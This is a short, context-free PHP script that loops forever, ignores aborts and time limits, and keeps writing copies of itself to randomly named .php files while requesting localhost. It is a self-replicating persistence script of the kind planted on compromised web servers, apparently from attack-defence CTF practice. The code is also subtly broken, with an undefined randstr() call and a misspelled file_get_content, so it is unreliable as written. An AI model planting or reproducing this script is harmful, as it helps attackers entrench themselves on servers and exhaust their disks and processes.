<?php
    set_time_limit(0);
    ignore_user_abort(true);
    while(1){
        file_put_contents(randstr().'.php',file_get_content(__FILE__));
        file_get_contents("http://127.0.0.1/");
    }
?>